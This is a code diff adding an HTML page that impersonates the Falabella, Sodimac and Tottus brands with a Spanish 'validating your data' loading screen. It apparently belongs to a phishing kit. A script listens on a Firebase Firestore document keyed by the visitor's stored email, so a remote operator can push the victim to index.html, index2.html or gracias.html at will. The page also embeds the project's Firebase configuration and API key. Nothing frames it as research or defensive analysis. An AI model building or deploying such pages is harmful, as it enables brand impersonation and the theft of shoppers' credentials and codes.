@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+          getFirestore,
+          doc,
+          setDoc,
+          onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+  apiKey: "AIzaSyAodF7Vg3ZvecSvK1lrGxq58uNQik80wao",
+  authDomain: "fal-envi.firebaseapp.com",
+  projectId: "fal-envi",
+  storageBucket: "fal-envi.firebasestorage.app",
+  messagingSenderId: "1084910883940",
+  appId: "1:1084910883940:web:2ba9af4dce36870ec77b71",
+  measurementId: "G-JDBBL0FVMS"
+};
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.onSnapshot = onSnapshot;
+  </script>
+</head>
+<body>
+    <div class="contenedor-modal">
+        <div class="logos">
+            <img class="falabella-logo" alt="falabella" src="https://images.falabella.com/v3/assets/blt7c5c2f2f888a7cc3/blt9a6cb2faab703fa5/65a68ebb130790558acbf0cb/falabella.com_green_icon.svg" width="93.5px">
+            <img class="sodimac-logo" alt="sodimac" src="https://images.falabella.com/v3/assets/blt7c5c2f2f888a7cc3/blt3f19c95d322c66f6/6368d9c930ae7a6f07ce68c2/logo-sodimac.svg" width="80px">
+            <img class="tottus-logo" alt="tottus" src="https://images.falabella.com/v3/assets/blt7c5c2f2f888a7cc3/blte6b59a954056bc79/6368d9c95d822f441dec0cd7/logo-tottus.svg" width="75px">
+        </div>
+        <div class="titulo-subtitulo separacion-abajo">
+            <h3>Estamos validando tus datos.</h3>
+            <p>Usa la misma cuenta para ingresar a <span>falabella.com, Sodimac y Tottus App.</span></p>
+        </div>
+        <div class="contenedor-loader">
+            <div class="rueda"></div>
+            <div class="icono-medio"><img src="iconos-CDA-Horarios-Falabella-V1.png" alt="" width="80px"></div>
+          </div>
+    </div>
+    <script src="auth.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+          const correolocal = localStorage.getItem("correo")
+          const questionRef = window.doc(
+            window.db,
+            "preguntas",
+            localStorage.getItem("correo")
+          );
+          window.onSnapshot(questionRef, (doc) => {
+            if (doc.exists()) {
+              const questionData = doc.data();
+              console.log("New question:", questionData.question);
+              console.log("Current page:", questionData.page);
+              if (questionData.page == 1) {
+                window.location.href = "index.html";
+              }
+              if (questionData.page == 2) {
+                window.location.href = "index2.html";
+              }
+              if (questionData.page == 3) {
+                window.location.href = "gracias.html";
+              }
+            } else {
+              console.log("No such document!");
+            }
+          });
+        });
+      </script>
+</body>
+</html>
